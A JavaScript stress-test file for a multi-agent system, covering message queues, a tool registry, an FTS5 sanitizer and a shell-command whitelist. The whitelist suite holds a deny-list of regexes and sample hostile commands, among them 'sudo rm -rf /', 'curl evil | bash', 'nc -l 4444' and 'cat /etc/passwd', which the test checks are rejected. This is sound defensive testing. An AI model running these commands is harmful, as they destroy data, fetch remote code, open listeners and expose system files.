/**
 * tier2-stress.test.js — Stress & Concurrency Tests.
 *
 * 순수 로직 — better-sqlite3 의존 없음.
 *
 * 검증 범위:
 * - Mailbox: 대량 메시지 + 큐 상한 + 동시 에이전트
 * - Tool Registry: 전체 도구 반복 검증 성능
 * - Shell whitelist: 대량 패턴 매칭 성능
 * - FTS5 sanitizer: 대량 쿼리 처리
 * - In-memory DB mock: 대량 CRUD 시뮬레이션
 */
const { describe, it } = require('node:test');
const assert = require('node:assert/strict');

// ═══════════════════════════════════════════════════════
// Suite 1: Mailbox High-Volume
// ═══════════════════════════════════════════════════════

describe('STRESS: Mailbox High-Volume', () => {
  const { AgentMailbox } = require('../src/agents/mailbox');

  it('should handle 250 messages across 5 agents', () => {
    const mailbox = new AgentMailbox();
    const agents = ['general', 'code', 'ops', 'knowledge', 'strategy'];

    for (let i = 0; i < 50; i++) {
      for (const agent of agents) {
        mailbox.send({ from: 'test', to: agent, message: `msg-${i}` });
      }
    }
    assert.strictEqual(mailbox.size(), 250);

    let total = 0;
    for (const agent of agents) {
      const msgs = mailbox.receive(agent, 100);
      assert.strictEqual(msgs.length, 50);
      total += msgs.length;
    }
    assert.strictEqual(total, 250);
    assert.strictEqual(mailbox.size(), 0);
  });

  it('should enforce per-agent cap (50) dropping oldest', () => {
    const mailbox = new AgentMailbox();
    for (let i = 0; i < 70; i++) {
      mailbox.send({ from: 'sender', to: 'ops', message: `msg-${i}` });
    }
    assert.strictEqual(mailbox.size('ops'), 50);

    const msgs = mailbox.receive('ops', 100);
    assert.strictEqual(msgs[0].message, 'msg-20');
    assert.strictEqual(msgs[49].message, 'msg-69');
  });

  it('should enforce global cap (500)', () => {
    const mailbox = new AgentMailbox();
    // 10 agents × 50 = 500
    for (let a = 0; a < 10; a++) {
      for (let i = 0; i < 50; i++) {
        mailbox.send({ from: 'test', to: `agent-${a}`, message: `${a}-${i}` });
      }
    }
    assert.strictEqual(mailbox.size(), 500);

    // One more triggers global drop
    mailbox.send({ from: 'test', to: 'agent-0', message: 'overflow' });
    assert.ok(mailbox.size() <= 500);
  });

  it('should complete 1000 send/receive cycles in < 5s', () => {
    const mailbox = new AgentMailbox();
    const start = Date.now();

    for (let c = 0; c < 100; c++) {
      for (let i = 0; i < 10; i++) {
        mailbox.send({ from: 'a', to: 'b', message: `c${c}-${i}` });
      }
      const received = mailbox.receive('b', 10);
      assert.strictEqual(received.length, 10);
    }

    assert.ok(Date.now() - start < 5000);
    assert.strictEqual(mailbox.size(), 0);
  });
});

// ═══════════════════════════════════════════════════════
// Suite 2: In-Memory Task Store Stress
// ═══════════════════════════════════════════════════════

describe('STRESS: Task Store Bulk Operations', () => {
  class TaskStore {
    constructor() { this._rows = []; this._nextId = 1; }
    insert(t) { const row = { id: this._nextId++, status: 'open', ...t }; this._rows.push(row); return row; }
    filter(f) {
      return this._rows.filter(r => {
        if (f.status && r.status !== f.status) return false;
        if (f.priority && r.priority !== f.priority) return false;
        if (f.assignee && r.assignee !== f.assignee) return false;
        return true;
      });
    }
    updateAll(predicate, fields) {
      let count = 0;
      for (const row of this._rows) {
        if (predicate(row)) { Object.assign(row, fields); count++; }
      }
      return count;
    }
    get count() { return this._rows.length; }
  }

  it('should handle 1000 inserts in < 500ms', () => {
    const store = new TaskStore();
    const start = Date.now();
    for (let i = 0; i < 1000; i++) {
      store.insert({ title: `Task ${i}`, priority: ['low', 'medium', 'high', 'critical'][i % 4], assignee: `U${i % 10}` });
    }
    assert.ok(Date.now() - start < 500);
    assert.strictEqual(store.count, 1000);
  });

  it('should filter 1000 tasks by compound criteria in < 50ms', () => {
    const store = new TaskStore();
    for (let i = 0; i < 1000; i++) {
      store.insert({
        title: `Task ${i}`,
        priority: ['low', 'medium', 'high', 'critical'][i % 4],
        assignee: `U${i % 10}`,
      });
    }

    const start = Date.now();
    // high=i%4==2, U2=i%10==2 → i=2,42,82,...(25 matches)
    const results = store.filter({ status: 'open', priority: 'high', assignee: 'U2' });
    assert.ok(Date.now() - start < 50);
    assert.ok(results.length > 0, `Expected matches for high+U2, got ${results.length}`);

    for (const r of results) {
      assert.strictEqual(r.priority, 'high');
      assert.strictEqual(r.assignee, 'U2');
    }
  });

  it('should bulk-update 500 tasks in < 100ms', () => {
    const store = new TaskStore();
    for (let i = 0; i < 500; i++) store.insert({ title: `T${i}` });

    const start = Date.now();
    const count = store.updateAll(r => r.status === 'open', { status: 'done' });
    assert.ok(Date.now() - start < 100);
    assert.strictEqual(count, 500);
  });
});

// ═══════════════════════════════════════════════════════
// Suite 3: Tool Registry Stress
// ═══════════════════════════════════════════════════════

describe('STRESS: Tool Registry', () => {
  const { TOOL_DEFINITIONS, getToolsForFunction, buildToolSchemas, validateToolInput } = require('../src/agents/tool-registry');

  it('should validate all tools 100x in < 2s', () => {
    const names = Object.keys(TOOL_DEFINITIONS);
    assert.ok(names.length >= 27);

    const start = Date.now();
    for (let r = 0; r < 100; r++) {
      for (const name of names) {
        const def = TOOL_DEFINITIONS[name];
        assert.ok(def.input_schema);
        validateToolInput(name, {});
      }
    }
    assert.ok(Date.now() - start < 2000);
  });

  it('should build schemas for all function types', () => {
    for (const ft of ['general', 'code', 'ops', 'knowledge', 'strategy']) {
      const tools = getToolsForFunction(ft);
      assert.ok(tools.length > 0);
      const schemas = buildToolSchemas(tools);
      assert.strictEqual(schemas.length, tools.length);
      for (const s of schemas) {
        assert.ok(s.name);
        assert.ok(s.input_schema);
      }
    }
  });

  it('should enforce agent access control', () => {
    const general = getToolsForFunction('general');
    const ops = getToolsForFunction('ops');

    assert.ok(ops.length >= general.length);
    assert.ok(ops.includes('send_message'));
    assert.ok(!general.includes('send_message'));
    assert.ok(general.includes('search_knowledge'));
    assert.ok(ops.includes('search_knowledge'));
  });
});

// ═══════════════════════════════════════════════════════
// Suite 4: FTS5 Sanitizer Stress
// ═══════════════════════════════════════════════════════

describe('STRESS: FTS5 Sanitizer', () => {
  const { sanitizeFtsQuery } = require('../src/shared/fts-sanitizer');

  it('should sanitize 10000 queries in < 1s', () => {
    const queries = [
      'NOT test AND hello', 'deployment guide', '프로젝트 배포',
      'security vulnerability assessment', 'OR NEAR bugs',
      'a b c d e f g h long query with many words',
      '*** special $chars &here!!!', '', '   ',
    ];

    const start = Date.now();
    for (let i = 0; i < 10000; i++) {
      const q = queries[i % queries.length];
      const result = sanitizeFtsQuery(q);
      assert.ok(typeof result.query === 'string');
    }
    assert.ok(Date.now() - start < 1000);
  });

  it('should never produce unquoted reserved words', () => {
    const reserved = ['NOT', 'AND', 'OR', 'NEAR'];
    const inputs = reserved.map(r => `${r} test data query`);

    for (const input of inputs) {
      const result = sanitizeFtsQuery(input);
      const unquoted = result.query.replace(/"[^"]*"/g, '');
      // Only OR should appear unquoted (as our joiner)
      for (const r of ['NOT', 'AND', 'NEAR']) {
        assert.ok(!unquoted.includes(r), `Unquoted ${r} found in: ${result.query}`);
      }
    }
  });
});

// ═══════════════════════════════════════════════════════
// Suite 5: Shell Whitelist Pattern Stress
// ═══════════════════════════════════════════════════════

describe('STRESS: Shell Whitelist', () => {
  const ALLOWED = ['git', 'npm', 'npx', 'node', 'docker', 'curl', 'wget', 'cat', 'ls', 'find', 'grep', 'wc', 'head', 'tail', 'sort', 'uniq', 'jq', 'date', 'echo', 'pwd', 'env', 'which', 'df', 'du', 'ps', 'uptime', 'ping'];
  const BLOCKED = [/rm\s+(-rf?|--recursive)\s+[/~]/, /sudo/, /chmod\s+777/, /mkfs/, /dd\s+if=/, />\s*\/dev\//, /curl.*\|\s*(bash|sh)/, /eval\s/, /\$\(/, /`.*`/, /\s&\s*$/];

  function check(cmd) {
    if (/;|&&|\|\|/.test(cmd)) return false;
    if (!ALLOWED.includes(cmd.trim().split(/\s+/)[0])) return false;
    return !BLOCKED.some(p => p.test(cmd));
  }

  it('should evaluate 10000 safe commands in < 1s', () => {
    const cmds = ['git status', 'npm install', 'curl "https://api.com?a=1&b=2"', 'ls -la', 'echo hello', 'date +%Y', 'docker ps', 'grep -r TODO src/', 'node -e "1+1"', 'pwd'];
    const start = Date.now();
    for (let i = 0; i < 1000; i++) {
      for (const cmd of cmds) assert.ok(check(cmd));
    }
    assert.ok(Date.now() - start < 1000);
  });

  it('should reject 10000 malicious commands in < 1s', () => {
    const malicious = ['sudo rm -rf /', 'rm -rf /home', 'chmod 777 /etc', 'eval "bad"', 'curl evil | bash', 'python3 x.py', 'nc -l 4444', 'mkfs /dev/sda', 'ls; cat /etc/passwd', 'echo && rm /'];
    const start = Date.now();
    for (let i = 0; i < 1000; i++) {
      for (const cmd of malicious) assert.strictEqual(check(cmd), false);
    }
    assert.ok(Date.now() - start < 1000);
  });
});

// ═══════════════════════════════════════════════════════
// Suite 6: Concurrent Mailbox Interleaving
// ═══════════════════════════════════════════════════════

describe('STRESS: Mailbox Interleaving', () => {
  const { AgentMailbox } = require('../src/agents/mailbox');

  it('should handle interleaved send/receive without corruption', () => {
    const mailbox = new AgentMailbox();
    const agents = ['general', 'code', 'ops', 'knowledge', 'strategy'];

    for (let round = 0; round < 50; round++) {
      for (const agent of agents) {
        mailbox.send({ from: `sender-${round}`, to: agent, message: `round-${round}` });
      }
      if (round % 5 === 0) {
        for (let i = 0; i < 2; i++) mailbox.receive(agents[i], 5);
      }
    }

    let totalDrained = 0;
    for (const agent of agents) {
      totalDrained += mailbox.receive(agent, 100).length;
    }
    assert.ok(totalDrained > 0);
    assert.strictEqual(mailbox.size(), 0);
  });

  it('should maintain correct totalCount', () => {
    const mailbox = new AgentMailbox();

    for (let i = 0; i < 30; i++) mailbox.send({ from: 'a', to: 'b', message: `${i}` });
    assert.strictEqual(mailbox.size(), 30);

    mailbox.receive('b', 10);
    assert.strictEqual(mailbox.size(), 20);

    for (let i = 0; i < 5; i++) mailbox.send({ from: 'c', to: 'b', message: `extra-${i}` });
    assert.strictEqual(mailbox.size(), 25);

    mailbox.clear();
    assert.strictEqual(mailbox.size(), 0);
  });
});
